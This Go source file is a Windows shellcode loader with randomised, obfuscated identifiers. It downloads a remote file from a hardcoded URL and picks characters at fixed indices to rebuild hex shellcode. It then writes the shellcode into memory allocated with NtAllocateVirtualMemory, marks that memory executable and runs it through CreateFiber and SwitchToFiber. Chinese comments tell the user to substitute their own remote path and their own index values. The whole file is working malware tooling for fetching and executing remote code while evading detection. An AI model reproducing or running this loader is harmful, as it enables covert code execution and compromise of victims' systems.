package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	PAGE_READWRITE         = 0x04
)

var (
	oUxw1nUCH2wth7vC = syscall.NewLazyDLL("kernel32.dll")
	Ex2JMuzqOI43AOSP = syscall.NewLazyDLL("ntdll.dll")
	ulLGSryeZtMpoWHn = oUxw1nUCH2wth7vC.NewProc("VirtualProtectEx")
	K7QPk0MYD5N61p0u = oUxw1nUCH2wth7vC.NewProc("CreateFileMappingW")
	NOMpdLV4aCfUcLsZ = oUxw1nUCH2wth7vC.NewProc("MapViewOfFile")
	LwDkOjDQfsyT0dyg = oUxw1nUCH2wth7vC.NewProc("UnmapViewOfFile")
	I8OSPaCmGHMVQhTR = oUxw1nUCH2wth7vC.NewProc("CreateFiber")
	IqnTIRlUGEiLkN7f = oUxw1nUCH2wth7vC.NewProc("SwitchToFiber")
	jikUUVK1pJ2Dlfjd = oUxw1nUCH2wth7vC.NewProc("ConvertThreadToFiber")
	D70NTYTndDvdaqTB = Ex2JMuzqOI43AOSP.NewProc("NtAllocateVirtualMemory")
)

// 改成自定义从AssembleShellCode.exe运行获取的结果
var IfMrYTKQUTuIixdz = []int{1, 4, 10101, 10027}

func main() {
	rbMWR5cq2k8VjQVE, YM2jgGlxdEdAaC0b := jAT5M3egkmlZz1oL()
	if YM2jgGlxdEdAaC0b != nil {
		return
	}
	mytySkMrlcLzUWYZ, YM2jgGlxdEdAaC0b := FQ4fyzAfNGzKVwP5(len(rbMWR5cq2k8VjQVE))
	if YM2jgGlxdEdAaC0b != nil {
		return
	}
	YM2jgGlxdEdAaC0b = CR7YtorpVrPImu1L(mytySkMrlcLzUWYZ, rbMWR5cq2k8VjQVE)
	if YM2jgGlxdEdAaC0b != nil {
		return
	}
	YM2jgGlxdEdAaC0b = etI5L85hGlqYHh1q(mytySkMrlcLzUWYZ, len(rbMWR5cq2k8VjQVE))
	if YM2jgGlxdEdAaC0b != nil {
		return
	}
	YM2jgGlxdEdAaC0b = kOWDDTTtiNIF7tsK(mytySkMrlcLzUWYZ)
	if YM2jgGlxdEdAaC0b != nil {
		return
	}
}

func jAT5M3egkmlZz1oL() ([]byte, error) {
	//修改成自定义的远程字典路径
	C3G0UjPdV0GtpsPi := "https://www.fucksec.com/caonima/sb.js"
	vHdrRdMrXSU8ShkA, YM2jgGlxdEdAaC0b := http.Get(C3G0UjPdV0GtpsPi)
	if YM2jgGlxdEdAaC0b != nil {
		return nil, fmt.Errorf("[-]Error:", YM2jgGlxdEdAaC0b)
	}
	defer vHdrRdMrXSU8ShkA.Body.Close()
	hBHU40wMwQYPB994, YM2jgGlxdEdAaC0b := ioutil.ReadAll(vHdrRdMrXSU8ShkA.Body)
	if YM2jgGlxdEdAaC0b != nil {
		return nil, fmt.Errorf("[-]Error:", YM2jgGlxdEdAaC0b)
	}
	mXnQuszlQrOLghHX := make([]string, len(IfMrYTKQUTuIixdz))
	for i, idx := range IfMrYTKQUTuIixdz {
		mXnQuszlQrOLghHX[i] = string(hBHU40wMwQYPB994[idx])
	}
	g6EDXqizUzdYtt6E := strings.Join(mXnQuszlQrOLghHX, "")
	rbMWR5cq2k8VjQVE := make([]byte, len(g6EDXqizUzdYtt6E)/2)
	for i := 0; i < len(g6EDXqizUzdYtt6E); i += 2 {
		KWUJkecsYPJFOZnO, YM2jgGlxdEdAaC0b := strconv.ParseUint(g6EDXqizUzdYtt6E[i:i+2], 16, 8)
		if YM2jgGlxdEdAaC0b != nil {
			return nil, fmt.Errorf("[-]Error:", YM2jgGlxdEdAaC0b)
		}
		rbMWR5cq2k8VjQVE[i/2] = byte(KWUJkecsYPJFOZnO)
	}
	return rbMWR5cq2k8VjQVE, nil
}

func FQ4fyzAfNGzKVwP5(HNEIVkdGrUR754Bd int) (uintptr, error) {
	var mytySkMrlcLzUWYZ uintptr
	zpc6uOxSvVG03j2L := uintptr(HNEIVkdGrUR754Bd)
	jgHhrjh9xdKBi3eQ := syscall.Handle(^uintptr(0))
	YfrUn7JIHYqFHJPA, _, _ := D70NTYTndDvdaqTB.Call(
		uintptr(jgHhrjh9xdKBi3eQ),
		uintptr(unsafe.Pointer(&mytySkMrlcLzUWYZ)),
		0,
		uintptr(unsafe.Pointer(&zpc6uOxSvVG03j2L)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	if YfrUn7JIHYqFHJPA != 0 {
		return 0, fmt.Errorf("[-]Error:", YfrUn7JIHYqFHJPA)
	}
	return mytySkMrlcLzUWYZ, nil
}

func CR7YtorpVrPImu1L(mytySkMrlcLzUWYZ uintptr, rbMWR5cq2k8VjQVE []byte) error {
	lVjABF7apuUXx2ld, _ := syscall.UTF16PtrFromString("")
	dowVR8qhbwnMooNQ, _, YM2jgGlxdEdAaC0b := K7QPk0MYD5N61p0u.Call(
		uintptr(0xFFFFFFFFFFFFFFFF),
		0,
		PAGE_READWRITE,
		0,
		uintptr(len(rbMWR5cq2k8VjQVE)),
		uintptr(unsafe.Pointer(lVjABF7apuUXx2ld)),
	)
	if dowVR8qhbwnMooNQ == 0 {
		return fmt.Errorf("[-]Error:", YM2jgGlxdEdAaC0b)
	}
	defer syscall.CloseHandle(syscall.Handle(dowVR8qhbwnMooNQ))
	x11BCO5gwNgzVvNa, _, YM2jgGlxdEdAaC0b := NOMpdLV4aCfUcLsZ.Call(
		dowVR8qhbwnMooNQ,
		0x2,
		0,
		0,
		uintptr(len(rbMWR5cq2k8VjQVE)),
	)
	if x11BCO5gwNgzVvNa == 0 {
		return fmt.Errorf("[-]Error:", YM2jgGlxdEdAaC0b)
	}
	defer LwDkOjDQfsyT0dyg.Call(x11BCO5gwNgzVvNa)
	for i := 0; i < len(rbMWR5cq2k8VjQVE); i++ {
		*(*byte)(unsafe.Pointer(x11BCO5gwNgzVvNa + uintptr(i))) = rbMWR5cq2k8VjQVE[i]
	}
	for i := 0; i < len(rbMWR5cq2k8VjQVE); i++ {
		*(*byte)(unsafe.Pointer(mytySkMrlcLzUWYZ + uintptr(i))) = *(*byte)(unsafe.Pointer(x11BCO5gwNgzVvNa + uintptr(i)))
	}
	return nil
}

func etI5L85hGlqYHh1q(mytySkMrlcLzUWYZ uintptr, HNEIVkdGrUR754Bd int) error {
	var wdPmUECRbGZdX6wQ uint32
	jgHhrjh9xdKBi3eQ := syscall.Handle(^uintptr(0))
	Pzr9B56SWpTXPGmv, _, YM2jgGlxdEdAaC0b := ulLGSryeZtMpoWHn.Call(
		uintptr(jgHhrjh9xdKBi3eQ),
		mytySkMrlcLzUWYZ,
		uintptr(HNEIVkdGrUR754Bd),
		PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&wdPmUECRbGZdX6wQ)),
	)
	if Pzr9B56SWpTXPGmv == 0 {
		return fmt.Errorf("[-]Error:", YM2jgGlxdEdAaC0b)
	}
	return nil
}

func kOWDDTTtiNIF7tsK(OEr9sulyRxDKiMlP uintptr) error {
	ZOrZUU19LeIumkYF, _, YM2jgGlxdEdAaC0b := jikUUVK1pJ2Dlfjd.Call(0)
	if ZOrZUU19LeIumkYF == 0 {
		return fmt.Errorf("[-]Error:", YM2jgGlxdEdAaC0b)
	}
	WrVqw9P2EL70UERs, _, YM2jgGlxdEdAaC0b := I8OSPaCmGHMVQhTR.Call(
		0,
		OEr9sulyRxDKiMlP,
		0,
	)
	if WrVqw9P2EL70UERs == 0 {
		return fmt.Errorf("[-]Error:", YM2jgGlxdEdAaC0b)
	}
	IqnTIRlUGEiLkN7f.Call(WrVqw9P2EL70UERs)
	IqnTIRlUGEiLkN7f.Call(ZOrZUU19LeIumkYF)
	return nil
}
